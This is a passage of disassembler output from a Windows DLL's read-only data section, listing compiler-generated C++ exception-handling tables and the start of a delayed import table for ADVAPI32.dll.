		dd 0FFFFFFA4h
		dd offset loc_6AF43AEC
dword_6AF634B4	dd 2 dup(4), 5,	2	; DATA XREF: .rdata:6AF634D8o
		dd offset dword_6AF63494
dword_6AF634C8	dd 19930520h, 6		; DATA XREF: unknown_libname_80o
		dd offset dword_6AF63464
		dd 1
		dd offset dword_6AF634B4
		dd 2 dup(0)
stru_6AF634E4	_msExcInfo 2 dup(<-1, 0>) ; DATA XREF: .rdata:stru_6AF63518o
stru_6AF634F4	_msRttiDscr <8,	offset stru_6AF68034, 0, offset	sub_6AF43D9C>
					; DATA XREF: .rdata:stru_6AF63504o
stru_6AF63504	dd 0, 0, 1		; _unk ; DATA XREF: .rdata:stru_6AF63518o
		dd 1			; Count
		dd offset stru_6AF634F4	; RttiBlkPtr
stru_6AF63518	_msExcept7 <19930520h, 2, offset stru_6AF634E4,	1, \
					; DATA XREF: unknown_libname_81o
			    offset stru_6AF63504, 0>
stru_6AF63534	_msExcInfo 2 dup(<-1, 0>) ; DATA XREF: .rdata:stru_6AF63568o
stru_6AF63544	_msRttiDscr <8,	offset stru_6AF68034, 0, offset	loc_6AF43DE2>
					; DATA XREF: .rdata:stru_6AF63554o
stru_6AF63554	dd 0, 0, 1		; _unk ; DATA XREF: .rdata:stru_6AF63568o
		dd 1			; Count
		dd offset stru_6AF63544	; RttiBlkPtr
stru_6AF63568	_msExcept7 <19930520h, 2, offset stru_6AF63534,	1, \
					; DATA XREF: unknown_libname_82o
			    offset stru_6AF63554, 0>
stru_6AF63584	_msExcInfo 2 dup(<-1, 0>) ; DATA XREF: .rdata:stru_6AF635B8o
stru_6AF63594	_msRttiDscr <8,	offset stru_6AF68034, 0, offset	sub_6AF43E2E>
					; DATA XREF: .rdata:stru_6AF635A4o
stru_6AF635A4	dd 0, 0, 1		; _unk ; DATA XREF: .rdata:stru_6AF635B8o
		dd 1			; Count
		dd offset stru_6AF63594	; RttiBlkPtr
stru_6AF635B8	_msExcept7 <19930520h, 2, offset stru_6AF63584,	1, \
					; DATA XREF: unknown_libname_83o
			    offset stru_6AF635A4, 0>
stru_6AF635D4	_msExcInfo 2 dup(<-1, 0>) ; DATA XREF: .rdata:stru_6AF63608o
stru_6AF635E4	_msRttiDscr <8,	offset stru_6AF68034, 0, offset	sub_6AF43E65>
					; DATA XREF: .rdata:stru_6AF635F4o
stru_6AF635F4	dd 0, 0, 1		; _unk ; DATA XREF: .rdata:stru_6AF63608o
		dd 1			; Count
		dd offset stru_6AF635E4	; RttiBlkPtr
stru_6AF63608	_msExcept7 <19930520h, 2, offset stru_6AF635D4,	1, \
					; DATA XREF: unknown_libname_84o
			    offset stru_6AF635F4, 0>
stru_6AF63624	_msExcInfo 2 dup(<-1, 0>) ; DATA XREF: .rdata:stru_6AF63658o
stru_6AF63634	_msRttiDscr <8,	offset stru_6AF68034, 0, offset	sub_6AF43E9C>
					; DATA XREF: .rdata:stru_6AF63644o
stru_6AF63644	dd 0, 0, 1		; _unk ; DATA XREF: .rdata:stru_6AF63658o
		dd 1			; Count
		dd offset stru_6AF63634	; RttiBlkPtr
stru_6AF63658	_msExcept7 <19930520h, 2, offset stru_6AF63624,	1, \
					; DATA XREF: unknown_libname_85o
			    offset stru_6AF63644, 0>
stru_6AF63674	_msExcInfo <-1,	offset sub_6AF5334A> ; DATA XREF: .rdata:stru_6AF6367Co
stru_6AF6367C	_msExcept7 <19930520h, 1, offset stru_6AF63674,	0, 0, 0>
					; DATA XREF: unknown_libname_86o
dword_6AF63698	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF636ECo
		dd offset sub_6AF5335D
		dd 4 dup(0)
dword_6AF636B0	dd 8			; DATA XREF: .rdata:6AF636E0o
		dd offset off_6AF680CC
		dd 0FFFFFFB4h
		dd offset sub_6AF445CE
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB8h
		dd offset sub_6AF44611
dword_6AF636D0	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF636F4o
		dd offset dword_6AF636B0
dword_6AF636E4	dd 19930520h, 3		; DATA XREF: unknown_libname_87o
		dd offset dword_6AF63698
		dd 1
		dd offset dword_6AF636D0
		align 10h
dword_6AF63700	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF63754o
		dd offset sub_6AF5336F
		dd 4 dup(0)
dword_6AF63718	dd 8			; DATA XREF: .rdata:6AF63748o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF44EAB
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset loc_6AF44EEE
dword_6AF63738	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF6375Co
		dd offset dword_6AF63718
dword_6AF6374C	dd 19930520h, 3		; DATA XREF: unknown_libname_88o
		dd offset dword_6AF63700
		dd 1
		dd offset dword_6AF63738
dword_6AF63760	dd 3 dup(0)		; DATA XREF: .rdata:6AF63788o
		dd offset off_6AF680CC
		dd 0
		dd 0FFFFFFFFh, 0
		dd 0Ch
		dd offset sub_6AF4523C
dword_6AF63784	dd 2			; DATA XREF: .rdata:6AF6379Co
		dd offset dword_6AF63760+8
		dd offset dword_6AF61E2C+8
dword_6AF63790	dd 0			; DATA XREF: Ordinal870+6Do
					; Ordinal910+19o ...
		dd offset sub_6AF45035
		dd 0
		dd offset dword_6AF63784
dword_6AF637A0	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF637F4o
		dd offset sub_6AF53381
		dd 4 dup(0)
dword_6AF637B8	dd 8			; DATA XREF: .rdata:6AF637E8o
		dd offset off_6AF680CC
		dd 0FFFFFFACh
		dd offset loc_6AF4514A
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB0h
		dd offset loc_6AF4518D
dword_6AF637D8	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF637FCo
		dd offset dword_6AF637B8
dword_6AF637EC	dd 19930520h, 3		; DATA XREF: unknown_libname_89o
		dd offset dword_6AF637A0
		dd 1
		dd offset dword_6AF637D8
		dd 2 dup(0)
stru_6AF63808	_msExcInfo <-1,	offset sub_6AF53393> ; DATA XREF: .rdata:stru_6AF63810o
stru_6AF63810	_msExcept7 <19930520h, 1, offset stru_6AF63808,	0, 0, 0>
					; DATA XREF: unknown_libname_90o
stru_6AF6382C	_msExcInfo <-1,	offset sub_6AF533A6> ; DATA XREF: .rdata:stru_6AF63834o
stru_6AF63834	_msExcept7 <19930520h, 1, offset stru_6AF6382C,	0, 0, 0>
					; DATA XREF: unknown_libname_91o
stru_6AF63850	_msExcInfo <-1,	offset sub_6AF533B9> ; DATA XREF: .rdata:stru_6AF63858o
stru_6AF63858	_msExcept7 <19930520h, 1, offset stru_6AF63850,	0, 0, 0>
					; DATA XREF: unknown_libname_92o
stru_6AF63874	_msExcInfo <-1,	offset sub_6AF533CB> ; DATA XREF: .rdata:stru_6AF6387Co
stru_6AF6387C	_msExcept7 <19930520h, 1, offset stru_6AF63874,	0, 0, 0>
					; DATA XREF: unknown_libname_93o
dword_6AF63898	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF638F4o
		dd offset sub_6AF533DD
		dd 0
		dd offset sub_6AF533E5
		dd 1, 0
		dd 1, 0
dword_6AF638B8	dd 8			; DATA XREF: .rdata:6AF638E8o
		dd offset off_6AF680CC
		dd 0FFFFFFD8h
		dd offset sub_6AF461BD
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset sub_6AF46200
dword_6AF638D8	dd 2 dup(2), 3,	2	; DATA XREF: .rdata:6AF638FCo
		dd offset dword_6AF638B8
dword_6AF638EC	dd 19930520h, 4		; DATA XREF: unknown_libname_94o
		dd offset dword_6AF63898
		dd 1
		dd offset dword_6AF638D8
		dd 2 dup(0)
dword_6AF63908	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF6394Co
		dd offset sub_6AF533F7
		dd 4 dup(0)
dword_6AF63920	dd 8			; DATA XREF: .rdata:6AF63940o
		dd offset off_6AF68118
		dd 0Ch
		dd offset loc_6AF47575
dword_6AF63930	dd 2 dup(1), 2,	1	; DATA XREF: .rdata:6AF63954o
		dd offset dword_6AF63920
dword_6AF63944	dd 19930520h, 3		; DATA XREF: unknown_libname_95o
		dd offset dword_6AF63908
		dd 1
		dd offset dword_6AF63930
		align 10h
dword_6AF63960	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF639A4o
		dd offset sub_6AF53409
		dd 4 dup(0)
dword_6AF63978	dd 8			; DATA XREF: .rdata:6AF63998o
		dd offset off_6AF68118
		dd 0Ch
		dd offset sub_6AF47671
dword_6AF63988	dd 2 dup(1), 2,	1	; DATA XREF: .rdata:6AF639ACo
		dd offset dword_6AF63978
dword_6AF6399C	dd 19930520h, 3		; DATA XREF: unknown_libname_96o
		dd offset dword_6AF63960
		dd 1
		dd offset dword_6AF63988
		dd 2 dup(0)
dword_6AF639B8	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF639FCo
		dd offset sub_6AF5341B
		dd 4 dup(0)
dword_6AF639D0	dd 8			; DATA XREF: .rdata:6AF639F0o
		dd offset off_6AF68118
		dd 0FFFFFFECh
		dd offset sub_6AF4773C
dword_6AF639E0	dd 2 dup(1), 2,	1	; DATA XREF: .rdata:6AF63A04o
		dd offset dword_6AF639D0
dword_6AF639F4	dd 19930520h, 3		; DATA XREF: unknown_libname_97o
		dd offset dword_6AF639B8
		dd 1
		dd offset dword_6AF639E0
		align 10h
stru_6AF63A10	_msExcInfo <-1,	offset sub_6AF5342D> ; DATA XREF: .rdata:stru_6AF63A18o
stru_6AF63A18	_msExcept7 <19930520h, 1, offset stru_6AF63A10,	0, 0, 0>
					; DATA XREF: unknown_libname_98o
dword_6AF63A34	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF63A78o
		dd offset sub_6AF53441
		dd 4 dup(0)
dword_6AF63A4C	dd 8			; DATA XREF: .rdata:6AF63A6Co
		dd offset off_6AF68118
		dd 0FFFFFFECh
		dd offset sub_6AF47876
dword_6AF63A5C	dd 2 dup(1), 2,	1	; DATA XREF: .rdata:6AF63A80o
		dd offset dword_6AF63A4C
dword_6AF63A70	dd 19930520h, 3		; DATA XREF: unknown_libname_99o
		dd offset dword_6AF63A34
		dd 1
		dd offset dword_6AF63A5C
		dd 2 dup(0)
dword_6AF63A8C	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF63AE0o
		dd offset sub_6AF53453
		dd 4 dup(0)
dword_6AF63AA4	dd 8			; DATA XREF: .rdata:6AF63AD4o
		dd offset off_6AF680CC
		dd 0FFFFFFACh
		dd offset loc_6AF486F0
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFA8h
		dd offset loc_6AF48733
dword_6AF63AC4	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF63AE8o
		dd offset dword_6AF63AA4
dword_6AF63AD8	dd 19930520h, 3		; DATA XREF: unknown_libname_100o
		dd offset dword_6AF63A8C
		dd 1
		dd offset dword_6AF63AC4
		dd 2 dup(0)
dword_6AF63AF4	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF63B48o
		dd offset sub_6AF53465
		dd 4 dup(0)
dword_6AF63B0C	dd 8			; DATA XREF: .rdata:6AF63B3Co
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF48EE0
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset loc_6AF48F23
dword_6AF63B2C	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF63B50o
		dd offset dword_6AF63B0C
dword_6AF63B40	dd 19930520h, 3		; DATA XREF: unknown_libname_101o
		dd offset dword_6AF63AF4
		dd 1
		dd offset dword_6AF63B2C
		dd 2 dup(0)
dword_6AF63B5C	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF63BB8o
		dd offset sub_6AF53477
		align 8
		dd offset sub_6AF5347F
		dd 1, 0
		dd 1, 0
dword_6AF63B7C	dd 8			; DATA XREF: .rdata:6AF63BACo
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF496D3
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset loc_6AF49716
dword_6AF63B9C	dd 2 dup(2), 3,	2	; DATA XREF: .rdata:6AF63BC0o
		dd offset dword_6AF63B7C
dword_6AF63BB0	dd 19930520h, 4		; DATA XREF: unknown_libname_102o
		dd offset dword_6AF63B5C
		dd 1
		dd offset dword_6AF63B9C
		dd 2 dup(0)
dword_6AF63BCC	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF63CD0o
		dd offset sub_6AF53491
		dd 0FFFFFFFFh
		dd offset sub_6AF53499
		dd 1, 0
		dd 1, 0
		dd 1
		dd offset sub_6AF534A1
		dd 4
		dd offset sub_6AF534AC
		dd 5
		dd offset sub_6AF534B7
		dd 6, 0
		dd 6, 0
		dd 6
		dd offset sub_6AF534BF
		dd 9, 0
		dd 9, 0
dword_6AF63C2C	dd 8			; DATA XREF: .rdata:6AF63C9Co
		dd offset off_6AF680CC
		dd 0FFFFFFD4h
		dd offset loc_6AF49869
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFF90h
		dd offset loc_6AF498AC
dword_6AF63C4C	dd 8			; DATA XREF: .rdata:6AF63CB0o
		dd offset off_6AF680CC
		dd 0FFFFFF90h
		dd offset loc_6AF499D2
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFF5Ch
		dd offset loc_6AF49A15
dword_6AF63C6C	dd 8			; DATA XREF: .rdata:6AF63CC4o
		dd offset off_6AF680CC
		dd 0FFFFFF5Ch
		dd offset loc_6AF49BA3
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFF90h
		dd offset loc_6AF49BE9
dword_6AF63C8C	dd 2 dup(2), 3,	2	; DATA XREF: .rdata:6AF63CD8o
		dd offset dword_6AF63C2C
		dd 2 dup(7), 8,	2
		dd offset dword_6AF63C4C
		dd 2 dup(0Ah), 0Bh, 2
		dd offset dword_6AF63C6C
dword_6AF63CC8	dd 19930520h, 0Ch	; DATA XREF: unknown_libname_103o
		dd offset dword_6AF63BCC
		dd 3
		dd offset dword_6AF63C8C
		dd 2 dup(0)
dword_6AF63CE4	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF63D38o
		dd offset sub_6AF534D1
		dd 4 dup(0)
dword_6AF63CFC	dd 8			; DATA XREF: .rdata:6AF63D2Co
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset sub_6AF4B06A
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset sub_6AF4B0AD
dword_6AF63D1C	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF63D40o
		dd offset dword_6AF63CFC
dword_6AF63D30	dd 19930520h, 3		; DATA XREF: unknown_libname_104o
		dd offset dword_6AF63CE4
		dd 1
		dd offset dword_6AF63D1C
		dd 2 dup(0)
dword_6AF63D4C	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF63DA0o
		dd offset sub_6AF534E3
		dd 4 dup(0)
dword_6AF63D64	dd 8			; DATA XREF: .rdata:6AF63D94o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset sub_6AF4B1AC
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset sub_6AF4B1EF
dword_6AF63D84	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF63DA8o
		dd offset dword_6AF63D64
dword_6AF63D98	dd 19930520h, 3		; DATA XREF: unknown_libname_105o
		dd offset dword_6AF63D4C
		dd 1
		dd offset dword_6AF63D84
		dd 2 dup(0)
dword_6AF63DB4	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF63E18o
		dd offset sub_6AF534F5
		dd 2 dup(0)
		dd 1
		dd offset sub_6AF53500
		dd 1
		dd offset sub_6AF53508
		dd 2 dup(0)
dword_6AF63DDC	dd 8			; DATA XREF: .rdata:6AF63E0Co
		dd offset off_6AF680CC
		dd 0FFFFFF70h
		dd offset loc_6AF4B5ED
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFF74h
		dd offset loc_6AF4B63F
dword_6AF63DFC	dd 1, 3, 4, 2		; DATA XREF: .rdata:6AF63E20o
		dd offset dword_6AF63DDC
dword_6AF63E10	dd 19930520h, 5		; DATA XREF: unknown_libname_106o
		dd offset dword_6AF63DB4
		dd 1
		dd offset dword_6AF63DFC
		dd 2 dup(0)
dword_6AF63E2C	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF63E88o
		dd offset sub_6AF5351A
		align 8
		dd offset sub_6AF53522
		dd 1, 0
		dd 1, 0
dword_6AF63E4C	dd 8			; DATA XREF: .rdata:6AF63E7Co
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF4B74E
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFACh
		dd offset loc_6AF4B791
dword_6AF63E6C	dd 2 dup(2), 3,	2	; DATA XREF: .rdata:6AF63E90o
		dd offset dword_6AF63E4C
dword_6AF63E80	dd 19930520h, 4		; DATA XREF: unknown_libname_107o
		dd offset dword_6AF63E2C
		dd 1
		dd offset dword_6AF63E6C
		dd 2 dup(0)
dword_6AF63E9C	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF63EF8o
		dd offset sub_6AF53534
		align 8
		dd offset sub_6AF5353F
		dd 1, 0
		dd 1, 0
dword_6AF63EBC	dd 8			; DATA XREF: .rdata:6AF63EECo
		dd offset off_6AF680CC
		dd 0FFFFFFB8h
		dd offset sub_6AF4B8D5
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset sub_6AF4B918
dword_6AF63EDC	dd 2 dup(2), 3,	2	; DATA XREF: .rdata:6AF63F00o
		dd offset dword_6AF63EBC
dword_6AF63EF0	dd 19930520h, 4		; DATA XREF: unknown_libname_108o
		dd offset dword_6AF63E9C
		dd 1
		dd offset dword_6AF63EDC
		dd 2 dup(0)
dword_6AF63F0C	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF63F80o
		dd offset sub_6AF53551
		align 8
		dd offset sub_6AF53559
		dd 1, 0
		dd 2
		dd offset sub_6AF53561
		dd 3
		dd offset sub_6AF53569
		dd 4
		dd offset sub_6AF53571
		dd 1, 0
dword_6AF63F44	dd 8			; DATA XREF: .rdata:6AF63F74o
		dd offset off_6AF680CC
		dd 0FFFFFF98h
		dd offset loc_6AF4BD86
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFF94h
		dd offset loc_6AF4BDC9
dword_6AF63F64	dd 2, 5, 6, 2		; DATA XREF: .rdata:6AF63F88o
		dd offset dword_6AF63F44
dword_6AF63F78	dd 19930520h, 7		; DATA XREF: unknown_libname_109o
		dd offset dword_6AF63F0C
		dd 1
		dd offset dword_6AF63F64
		dd 2 dup(0)
stru_6AF63F94	_msExcInfo <-1,	offset sub_6AF53583> ; DATA XREF: .rdata:stru_6AF63F9Co
stru_6AF63F9C	_msExcept7 <19930520h, 1, offset stru_6AF63F94,	0, 0, 0>
					; DATA XREF: unknown_libname_110o
dword_6AF63FB8	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF64030o
		dd offset sub_6AF53596
dword_6AF63FC0	dd 0Bh dup(0)
		dd offset loc_6AF4DAC8
dword_6AF63FF0	dd 3 dup(0)		; DATA XREF: .rdata:6AF64024o
		dd offset loc_6AF4DB6A
dword_6AF64000	dd 2 dup(1), 2,	1	; DATA XREF: .rdata:6AF64038o
		dd offset dword_6AF63FC0+20h
		dd 2 dup(3), 4,	1
		dd offset dword_6AF63FF0
dword_6AF64028	dd 19930520h, 5		; DATA XREF: unknown_libname_111o
		dd offset dword_6AF63FB8
		dd 2
		dd offset dword_6AF64000
		dd 2 dup(0)
stru_6AF64044	_msExcInfo 4 dup(<-1, 0>) ; DATA XREF: .rdata:stru_6AF640ACo
stru_6AF64064	_msRttiDscr <0,	0, 0, offset loc_6AF4DD0A>
					; DATA XREF: .rdata:stru_6AF64084o
stru_6AF64074	_msRttiDscr <0,	0, 0, offset loc_6AF4DD9A>
					; DATA XREF: .rdata:stru_6AF64084o
stru_6AF64084	dd 0, 0, 1		; _unk ; DATA XREF: .rdata:stru_6AF640ACo
		dd 1			; Count
		dd offset stru_6AF64064	; RttiBlkPtr
		dd 2, 2, 3		; _unk
		dd 1			; Count
		dd offset stru_6AF64074	; RttiBlkPtr
stru_6AF640AC	_msExcept7 <19930520h, 4, offset stru_6AF64044,	2, \
					; DATA XREF: unknown_libname_112o
			    offset stru_6AF64084, 0>
dword_6AF640C8	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF64170o
		dd offset sub_6AF535B5
		dd 4 dup(0)
		dd 0FFFFFFFFh
		dd offset sub_6AF535C0
		dd 3, 0
		dd 4
		dd offset sub_6AF535CB
		dd 3, 0
dword_6AF64100	dd 8			; DATA XREF: .rdata:6AF64150o
		dd offset off_6AF680CC
		dd 0FFFFFEBCh
		dd offset loc_6AF4E028
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFEB0h
		dd offset loc_6AF4E07A
dword_6AF64120	dd 8			; DATA XREF: .rdata:6AF64164o
		dd offset off_6AF680CC
		dd 0FFFFFEB0h
		dd offset loc_6AF4E207
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFEBCh
		dd offset loc_6AF4E259
dword_6AF64140	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF64178o
		dd offset dword_6AF64100
		dd 4, 5, 6, 2
		dd offset dword_6AF64120
dword_6AF64168	dd 19930520h, 7		; DATA XREF: unknown_libname_113o
		dd offset dword_6AF640C8
		dd 2
		dd offset dword_6AF64140
		dd 2 dup(0)
dword_6AF64184	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF641E0o
		dd offset sub_6AF535E0
		align 10h
		dd offset sub_6AF535EB
		dd 1, 0
		dd 1, 0
dword_6AF641A4	dd 8			; DATA XREF: .rdata:6AF641D4o
		dd offset off_6AF680CC
		dd 0FFFFFC74h
		dd offset loc_6AF4E4D5
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFC70h
		dd offset loc_6AF4E527
dword_6AF641C4	dd 2 dup(2), 3,	2	; DATA XREF: .rdata:6AF641E8o
		dd offset dword_6AF641A4
dword_6AF641D8	dd 19930520h, 4		; DATA XREF: unknown_libname_114o
		dd offset dword_6AF64184
		dd 1
		dd offset dword_6AF641C4
		dd 2 dup(0)
dword_6AF641F4	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF6426Co
		dd offset sub_6AF53600
dword_6AF641FC	dd 0Bh dup(0)
		dd offset loc_6AF4E9FB
dword_6AF6422C	dd 3 dup(0)		; DATA XREF: .rdata:6AF64260o
		dd offset loc_6AF4EA9D
dword_6AF6423C	dd 2 dup(1), 2,	1	; DATA XREF: .rdata:6AF64274o
		dd offset dword_6AF641FC+20h
		dd 2 dup(3), 4,	1
		dd offset dword_6AF6422C
dword_6AF64264	dd 19930520h, 5		; DATA XREF: unknown_libname_115o
		dd offset dword_6AF641F4
		dd 2
		dd offset dword_6AF6423C
		align 10h
dword_6AF64280	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF64328o
		dd offset sub_6AF53615
		dd 4 dup(0)
		dd 0FFFFFFFFh
		dd offset sub_6AF53620
		dd 3, 0
		dd 4
		dd offset sub_6AF5362B
		dd 3, 0
dword_6AF642B8	dd 8			; DATA XREF: .rdata:6AF64308o
		dd offset off_6AF680CC
		dd 0FFFFFE94h
		dd offset loc_6AF4ECB4
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFE98h
		dd offset loc_6AF4ED06
dword_6AF642D8	dd 8			; DATA XREF: .rdata:6AF6431Co
		dd offset off_6AF680CC
		dd 0FFFFFE98h
		dd offset loc_6AF4EEAD
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFE94h
		dd offset loc_6AF4EEFF
dword_6AF642F8	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF64330o
		dd offset dword_6AF642B8
		dd 4, 5, 6, 2
		dd offset dword_6AF642D8
dword_6AF64320	dd 19930520h, 7		; DATA XREF: unknown_libname_116o
		dd offset dword_6AF64280
		dd 2
		dd offset dword_6AF642F8
		dd 2 dup(0)
dword_6AF6433C	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF64398o
		dd offset sub_6AF53640
		dd 2 dup(0)
		dd 1
		dd offset sub_6AF5364B
		dd 2 dup(0)
dword_6AF6435C	dd 8			; DATA XREF: .rdata:6AF6438Co
		dd offset off_6AF680CC
		dd 0FFFFFD5Ch
		dd offset loc_6AF4F19D
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFD60h
		dd offset loc_6AF4F1EF
dword_6AF6437C	dd 1, 2, 3, 2		; DATA XREF: .rdata:6AF643A0o
		dd offset dword_6AF6435C
dword_6AF64390	dd 19930520h, 4		; DATA XREF: unknown_libname_117o
		dd offset dword_6AF6433C
		dd 1
		dd offset dword_6AF6437C
		dd 2 dup(0)
stru_6AF643AC	_msExcInfo <-1,	offset sub_6AF53660> ; DATA XREF: .rdata:stru_6AF643B4o
stru_6AF643B4	_msExcept7 <19930520h, 1, offset stru_6AF643AC,	0, 0, 0>
					; DATA XREF: unknown_libname_118o
dword_6AF643D0	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF6442Co
		dd offset sub_6AF53673
		dd 0
		dd offset sub_6AF5367B
		dd 1, 0
		dd 1, 0
dword_6AF643F0	dd 8			; DATA XREF: .rdata:6AF64420o
		dd offset off_6AF680CC
		dd 0FFFFFF98h
		dd offset loc_6AF4F71B
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFF9Ch
		dd offset loc_6AF4F75E
dword_6AF64410	dd 2 dup(2), 3,	2	; DATA XREF: .rdata:6AF64434o
		dd offset dword_6AF643F0
dword_6AF64424	dd 19930520h, 4		; DATA XREF: unknown_libname_119o
		dd offset dword_6AF643D0
		dd 1
		dd offset dword_6AF64410
		align 10h
dword_6AF64440	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF64494o
		dd offset sub_6AF5368D
		dd 4 dup(0)
dword_6AF64458	dd 8			; DATA XREF: .rdata:6AF64488o
		dd offset off_6AF680CC
		dd 0FFFFFFACh
		dd offset loc_6AF50075
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFA8h
		dd offset loc_6AF500B8
dword_6AF64478	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF6449Co
		dd offset dword_6AF64458
dword_6AF6448C	dd 19930520h, 3		; DATA XREF: unknown_libname_120o
		dd offset dword_6AF64440
		dd 1
		dd offset dword_6AF64478
		dd 2 dup(0)
stru_6AF644A8	_msExcInfo <-1,	offset sub_6AF5369F> ; DATA XREF: .rdata:stru_6AF644B0o
stru_6AF644B0	_msExcept7 <19930520h, 1, offset stru_6AF644A8,	0, 0, 0>
					; DATA XREF: unknown_libname_121o
dword_6AF644CC	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF64520o
		dd offset sub_6AF536B2
		dd 4 dup(0)
dword_6AF644E4	dd 8			; DATA XREF: .rdata:6AF64514o
		dd offset off_6AF680CC
		dd 0FFFFFFD4h
		dd offset loc_6AF5077A
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFACh
		dd offset loc_6AF507BD
dword_6AF64504	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF64528o
		dd offset dword_6AF644E4
dword_6AF64518	dd 19930520h, 3		; DATA XREF: unknown_libname_122o
		dd offset dword_6AF644CC
		dd 1
		dd offset dword_6AF64504
		dd 2 dup(0)
dword_6AF64534	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF64590o
		dd offset sub_6AF536C4
		dd 2 dup(0)
		dd 1
		dd offset sub_6AF536CC
		dd 2 dup(0)
dword_6AF64554	dd 8			; DATA XREF: .rdata:6AF64584o
		dd offset off_6AF680CC
		dd 0FFFFFFACh
		dd offset sub_6AF51D9B
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFA8h
		dd offset sub_6AF51DDE
dword_6AF64574	dd 1, 2, 3, 2		; DATA XREF: .rdata:6AF64598o
		dd offset dword_6AF64554
dword_6AF64588	dd 19930520h, 4		; DATA XREF: unknown_libname_123o
		dd offset dword_6AF64534
		dd 1
		dd offset dword_6AF64574
dword_6AF6459C	dd 3 dup(0)		; DATA XREF: .rdata:6AF645C4o
		dd offset off_6AF68118
		align 10h
		dd 0FFFFFFFFh, 0
		dd 10h
		dd offset sub_6AF52CB0
dword_6AF645C0	dd 1			; DATA XREF: .rdata:6AF645D4o
		dd offset dword_6AF6459C+8
dword_6AF645C8	dd 0			; DATA XREF: sub_6AF52C70+Bo
		dd offset sub_6AF52CF0
		dd 0
		dd offset dword_6AF645C0
ADVAPI32_dll_import_table dd 1		; DATA XREF: .text:6AF51FF6o
					; Attributes
		dd rva aAdvapi32_dll	; "ADVAPI32.dll"
		dd rva ADVAPI32_dll_handle ; Module handle
		dd rva FreeSid		; Delayed Import Address Table
		dd rva ADVAPI32_dll_dint ; Delayed Import Name Table
		dd rva ADVAPI32_dll_dbiat ; Bound Delayed Import Address Table
		dd 0			; Unload Delayed Import	Table
		dd 0			; Time stamp
		dd 8 dup(0)
ADVAPI32_dll_dint dd rva word_6AF646A8	; DATA XREF: .rdata:6AF645E8o
					; ADVAPI32.dll delayed import name table
		dd rva word_6AF646B2
		dd rva word_6AF646CE
		dd rva word_6AF646E4
		dd rva word_6AF646F4
		dd rva word_6AF64714
		dd rva word_6AF64724
		dd rva word_6AF64740
		dd rva word_6AF64758
		dd rva word_6AF64768
		dd rva word_6AF6477E
		dd rva word_6AF6478E
		dd rva word_6AF647A6
		dd rva word_6AF647B2
		dd rva word_6AF647C8
